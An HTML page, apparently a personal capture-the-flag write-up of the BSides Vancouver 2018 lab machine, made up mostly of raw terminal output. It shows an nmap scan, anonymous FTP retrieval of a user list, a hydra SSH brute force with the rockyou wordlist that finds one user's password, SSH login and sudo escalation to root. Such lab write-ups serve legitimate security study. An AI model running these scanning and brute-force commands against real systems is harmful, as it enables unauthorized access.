@@ -1,0 +1,464 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>BSides Vancouver</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/css/lightgallery.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.css" rel="stylesheet">
+        <!-- Add Pygments CSS for code highlighting -->
+        <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.highlight .hll { background-color: #ffffcc }
+.highlight { background: #f8f8f8; }
+.highlight .c { color: #3D7B7B; font-style: italic } /* Comment */
+.highlight .err { border: 1px solid #FF0000 } /* Error */
+.highlight .k { color: #008000; font-weight: bold } /* Keyword */
+.highlight .o { color: #666666 } /* Operator */
+.highlight .ch { color: #3D7B7B; font-style: italic } /* Comment.Hashbang */
+.highlight .cm { color: #3D7B7B; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #9C6500 } /* Comment.Preproc */
+.highlight .cpf { color: #3D7B7B; font-style: italic } /* Comment.PreprocFile */
+.highlight .c1 { color: #3D7B7B; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #3D7B7B; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #A00000 } /* Generic.Deleted */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #E40000 } /* Generic.Error */
+.highlight .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+.highlight .gi { color: #008400 } /* Generic.Inserted */
+.highlight .go { color: #717171 } /* Generic.Output */
+.highlight .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+.highlight .gt { color: #0044DD } /* Generic.Traceback */
+.highlight .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+.highlight .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+.highlight .kn { color: #008000; font-weight: bold } /* Keyword.Namespace */
+.highlight .kp { color: #008000 } /* Keyword.Pseudo */
+.highlight .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #B00040 } /* Keyword.Type */
+.highlight .m { color: #666666 } /* Literal.Number */
+.highlight .s { color: #BA2121 } /* Literal.String */
+.highlight .na { color: #687822 } /* Name.Attribute */
+.highlight .nb { color: #008000 } /* Name.Builtin */
+.highlight .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+.highlight .no { color: #880000 } /* Name.Constant */
+.highlight .nd { color: #AA22FF } /* Name.Decorator */
+.highlight .ni { color: #717171; font-weight: bold } /* Name.Entity */
+.highlight .ne { color: #CB3F38; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #0000FF } /* Name.Function */
+.highlight .nl { color: #767600 } /* Name.Label */
+.highlight .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+.highlight .nt { color: #008000; font-weight: bold } /* Name.Tag */
+.highlight .nv { color: #19177C } /* Name.Variable */
+.highlight .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mb { color: #666666 } /* Literal.Number.Bin */
+.highlight .mf { color: #666666 } /* Literal.Number.Float */
+.highlight .mh { color: #666666 } /* Literal.Number.Hex */
+.highlight .mi { color: #666666 } /* Literal.Number.Integer */
+.highlight .mo { color: #666666 } /* Literal.Number.Oct */
+.highlight .sa { color: #BA2121 } /* Literal.String.Affix */
+.highlight .sb { color: #BA2121 } /* Literal.String.Backtick */
+.highlight .sc { color: #BA2121 } /* Literal.String.Char */
+.highlight .dl { color: #BA2121 } /* Literal.String.Delimiter */
+.highlight .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+.highlight .s2 { color: #BA2121 } /* Literal.String.Double */
+.highlight .se { color: #AA5D1F; font-weight: bold } /* Literal.String.Escape */
+.highlight .sh { color: #BA2121 } /* Literal.String.Heredoc */
+.highlight .si { color: #A45A77; font-weight: bold } /* Literal.String.Interpol */
+.highlight .sx { color: #008000 } /* Literal.String.Other */
+.highlight .sr { color: #A45A77 } /* Literal.String.Regex */
+.highlight .s1 { color: #BA2121 } /* Literal.String.Single */
+.highlight .ss { color: #19177C } /* Literal.String.Symbol */
+.highlight .bp { color: #008000 } /* Name.Builtin.Pseudo */
+.highlight .fm { color: #0000FF } /* Name.Function.Magic */
+.highlight .vc { color: #19177C } /* Name.Variable.Class */
+.highlight .vg { color: #19177C } /* Name.Variable.Global */
+.highlight .vi { color: #19177C } /* Name.Variable.Instance */
+.highlight .vm { color: #19177C } /* Name.Variable.Magic */
+.highlight .il { color: #666666 } /* Literal.Number.Integer.Long */</style>
+        <style>
+            /* Center the HTML file on the screen */
+            body {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                padding-top: 30px;
+            }
+            /* Make the display width of the HTML file smaller */
+            .container {
+                max-width: 42vw;
+                margin: 0 auto;
+                height: 100%
+            }
+            
+            img {
+                width: 80%;
+            }
+        </style>
+        <script src="https://cdn.jsdelivr.net/npm/lightgallery.js/dist/js/lightgallery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js/dist/lg-thumbnail.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-zoom.js/dist/lg-zoom.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-fullscreen.js/dist/lg-fullscreen.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-share.js/dist/lg-share.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-autoplay.js/dist/lg-autoplay.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-rotate.js/dist/lg-rotate.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lg-flip.js/dist/lg-flip.min.js"></script>
+        <script>
+            window.onload = function() {
+                const images = document.getElementsByTagName('img');
+                const lightGalleryItems = [];
+                for (let i = 0; i < images.length; i++) {
+                    const img = images[i];
+                    if (img.naturalWidth > 1000) {
+                        if (window.innerWidth > 768) {
+                            img.style.width = '110%';
+                            img.style.transform = 'translateX(-4%)';
+                        } else {
+                            img.style.width = '100%';
+                            img.style.transform = 'none';
+                        }
+                    }
+                    lightGalleryItems.push({ src: img.src, thumb: img.src });
+                    img.setAttribute('data-lg-idx', i);
+                    img.addEventListener('click', function() {
+                        lightGallery(img, {
+                            dynamic: true,
+                            dynamicEl: lightGalleryItems,
+                            index: parseInt(img.getAttribute('data-lg-idx'))
+                        });
+                    });
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <h1 style="text-align:center; text-transform:uppercase; font-family: 'Playfair Display', serif; font-weight:700;"">BSides Vancouver</h1>
+
+<p>Tuesday, August 2, 2022</p>
+<p>3:17 AM</p>
+<p>sudo nmap -sS 192.168.1.0/24</p>
+<p>[sudo] password for kali:</p>
+<p>Starting Nmap 7.92 (  ) at 2022-08-03 05:18 EDT</p>
+<p>Nmap scan report for 192.168.1.1</p>
+<p>Host is up (0.00059s latency).</p>
+<p>Not shown: 999 closed tcp ports (reset)</p>
+<p>PORT STATE SERVICE</p>
+<p>53/tcp open domain</p>
+<p>MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)</p>
+<p>Nmap scan report for 192.168.1.2</p>
+<p>Host is up (0.0034s latency).</p>
+<p>Not shown: 996 filtered tcp ports (no-response)</p>
+<p>PORT STATE SERVICE</p>
+<p>80/tcp open http</p>
+<p>135/tcp open msrpc</p>
+<p>445/tcp open microsoft-ds</p>
+<p>1025/tcp open NFS-or-IIS</p>
+<p>MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)</p>
+<p>Nmap scan report for 192.168.1.3</p>
+<p>Host is up (0.00022s latency).</p>
+<p>All 1000 scanned ports on 192.168.1.3 are in ignored states.</p>
+<p>Not shown: 1000 filtered tcp ports (proto-unreach)</p>
+<p>MAC Address: 08:00:27:22:25:53 (Oracle VirtualBox virtual NIC)</p>
+<p>Nmap scan report for 192.168.1.12</p>
+<p>Host is up (0.00042s latency).</p>
+<p>Not shown: 997 closed tcp ports (reset)</p>
+<p>PORT STATE SERVICE</p>
+<p>21/tcp open ftp</p>
+<p>22/tcp open ssh</p>
+<p>80/tcp open http</p>
+<p>MAC Address: 08:00:27:F1:E5:AE (Oracle VirtualBox virtual NIC)</p>
+<p>Nmap scan report for 192.168.1.6</p>
+<p>Host is up (0.0000030s latency).</p>
+<p>All 1000 scanned ports on 192.168.1.6 are in ignored states.</p>
+<p>Not shown: 1000 closed tcp ports (reset)</p>
+<p>Nmap done: 256 IP addresses (5 hosts up) scanned in 11.71 seconds</p>
+<p>???(kali?kali)-[~]</p>
+<p>??$</p>
+<p>???(kali?kali)-[~]</p>
+<p>??$ ftp 192.168.1.12</p>
+<p>Connected to 192.168.1.12.</p>
+<p>220 (vsFTPd 2.3.5)</p>
+<p>Name (192.168.1.12:kali): anonymous</p>
+<p>230 Login successful.</p>
+<p>Remote system type is UNIX.</p>
+<p>Using binary mode to transfer files.</p>
+<p>ftp&gt; ls</p>
+<p>229 Entering Extended Passive Mode (|||51753|).</p>
+<p>150 Here comes the directory listing.</p>
+<p>drwxr-xr-x 2 65534 65534 4096 Mar 03 2018 public</p>
+<p>226 Directory send OK.</p>
+<p>ftp&gt; cd public</p>
+<p>250 Directory successfully changed.</p>
+<p>ftp&gt; ls</p>
+<p>229 Entering Extended Passive Mode (|||14397|).</p>
+<p>150 Here comes the directory listing.</p>
+<p>-rw-r--r-- 1 0 0 31 Mar 03 2018 users.txt.bk</p>
+<p>226 Directory send OK.</p>
+<p>ftp&gt; get users.txt.bk</p>
+<p>local: users.txt.bk remote: users.txt.bk</p>
+<p>229 Entering Extended Passive Mode (|||26448|).</p>
+<p>150 Opening BINARY mode data connection for users.txt.bk (31 bytes).</p>
+<p>100% |<strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong>*| 31 5.07 KiB/s 00:00 ETA</p>
+<p>226 Transfer complete.</p>
+<p>31 bytes received in 00:00 (4.17 KiB/s)</p>
+<p>cat users.txt.bk</p>
+<p>abatchy</p>
+<p>john</p>
+<p>mai</p>
+<p>anne</p>
+<p>doomguy</p>
+<p>hydra -t 5 -V -f -l anne -P /usr/share/wordlists/rockyou.txt 192.168.1.12 ssh</p>
+<p>Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
+<p>Hydra () starting at 2022-08-03 05:51:25</p>
+<p>[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task</p>
+<p>[DATA] attacking ssh://192.168.1.12:22/</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "123456" - 1 of 14344399 [child 0] (0/0)</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "12345" - 2 of 14344399 [child 1] (0/0)</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "123456789" - 3 of 14344399 [child 2] (0/0)</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "password" - 4 of 14344399 [child 3] (0/0)</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "princess" - 6 of 14344399 [child 1] (0/0)</p>
+<p>[ATTEMPT] target 192.168.1.12 - login "anne" - pass "1234567" - 7 of 14344399 [child 3] (0/0)</p>
+<p>[22][ssh] host: 192.168.1.12 login: anne password: princess</p>
+<p>[STATUS] attack finished for 192.168.1.12 (valid pair found)</p>
+<p>1 of 1 target successfully completed, 1 valid password found</p>
+<p>Hydra () finished at 2022-08-03 05:51:39</p>
+<p>ssh</p>
+<p>The authenticity of host '192.168.1.12 (192.168.1.12)' can't be established.</p>
+<p>ECDSA key fingerprint is SHA256:FhT9tr50Ps28yBw38pBWN+YEx5wCU/d8o1Ih22W4fyQ.</p>
+<p>This key is not known by any other names</p>
+<p>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</p>
+<p>Warning: Permanently added '192.168.1.12' (ECDSA) to the list of known hosts.</p>
+<p>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)</p>
+<ul>
+<li>Documentation:</li>
+</ul>
+<p>382 packages can be updated.</p>
+<p>275 updates are security updates.</p>
+<p>New release '14.04.5 LTS' available.</p>
+<p>Run 'do-release-upgrade' to upgrade to it.</p>
+<p>Last login: Sun Mar 4 16:14:55 2018 from 192.168.1.68</p>
+<p>anne@bsides2018:~$ whoami</p>
+<p>anne</p>
+<p>anne@bsides2018:~$ pwd</p>
+<p>/home/anne</p>
+<p>anne@bsides2018:~$ ls</p>
+<p>anne@bsides2018:~$ ls -la</p>
+<p>total 12</p>
+<p>drwxr-xr-x 3 anne anne 4096 Aug 3 02:51 .</p>
+<p>drwxr-xr-x 7 root root 4096 Mar 4 2018 ..</p>
+<p>drwx------ 2 anne anne 4096 Aug 3 02:51 .cache</p>
+<p>anne@bsides2018:~$ sudo su</p>
+<p>[sudo] password for anne:</p>
+<p>root@bsides2018:/home/anne# ls</p>
+<p>root@bsides2018:/home/anne# pwd</p>
+<p>/home/anne</p>
+<p>root@bsides2018:/home/anne# cd /root</p>
+<p>root@bsides2018:~# ls</p>
+<p>flag.txt</p>
+<p>root@bsides2018:~# cat flag.txt</p>
+<p>Congratulations!</p>
+                </div>
+            </div>
+        </div>    
+    </body>
+    </html>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+
+.copy-button {
+  position: absolute;
+  right: 5px ;
+  top: 5px;
+  border: transparent;
+  background-color: transparent;
+  padding: 2px 6px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  border-radius: 8px;
+
+}
+
+.copy-button:hover {
+  background-color: #30363d; # Change this to a different color to create a hover effect
+}
+.material-icons{
+  line-height:1.3;
+  color: #7d8590;
+}
+
+pre {
+  position: relative;
+  # padding: 20px;
+  border: 1px solid #e7ee7;
+  overflow-x: auto; # Remove this line to disable horizontal scrolling
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: 6px;
+  margin-bottom: 20px;
+
+  # Add these lines to set a fixed width for the code block and wrap long lines
+  #width: 80%;
+  white-space: pre-wrap; 
+}
+
+pre code {
+  display: block;
+  border-radius: 8px;
+  background-color: #2d2d2d; # Change this to a different color to match the copy button background
+
+}
+
+
+
+
+@media only screen and (min-width: 280px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and mobiles */
+  }
+}
+
+@media only screen and (max-width: 768px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and desktops */
+  }
+}
+
+# @media (min-width: 576px) {
+#   img {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   img {
+#     max-width: 720px;
+#   }
+# }
+
+
+
+@media (min-width: 280px) {
+  .container {
+    max-width: 90%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+@media (min-width: 750px) {
+  .container {
+    max-width: 80%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+
+
+@media (min-width: 912px) {
+  .container {
+    max-width: 70%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+# @media (min-width: 1200px) {
+#   .container {
+#     max-width: 70%;
+#     margin: 0 auto;
+#     height: 100%;
+#   }
+# }
+
+# @media (min-width: 576px) {
+#   .container {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   .container {
+#     max-width: 620px;
+#     margin: 0;
+#   }
+# }
+
+# @media (min-width: 992px) {
+#   .container {
+#     max-width: 760px;
+#   }
+# }
+
+@media (min-width: 1200px) {
+  .container {
+    max-width: 735px;
+    margin: 0;
+    height: 100%;
+  }
+}
+
+# p { 
+#   text-indent: 10px;
+# }
+
+h2 {
+  font-size: 1.5rem;
+}
+
+h3 {
+  font-size: 1.3rem;
+}
+
+# .container {
+#   max-width: 100%; /* Set the container width to 100% */
+#   padding-left: 15px; /* Add some padding to the left */
+#   padding-right: 15px; /* Add some padding to the right */
+# }
+
+
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark-reasonable.min.css">
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var codeBlocks = document.querySelectorAll('pre code');
+    codeBlocks.forEach(function(codeBlock) {
+      var copyButton = document.createElement('button');
+      copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+      copyButton.classList.add('copy-button');
+      codeBlock.parentNode.insertBefore(copyButton, codeBlock);
+
+      copyButton.addEventListener('click', function() {
+        var code = codeBlock.textContent;
+        var textarea = document.createElement('textarea');
+        textarea.textContent = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        textarea.remove();
+        copyButton.innerHTML = '<i class="material-icons">check</i>';
+        setTimeout(function() {
+          copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+        }, 2000);
+      });
+    });
+
+    // Initialize highlight.js for syntax highlighting
+    hljs.initHighlightingOnLoad();
+  });
+</script>
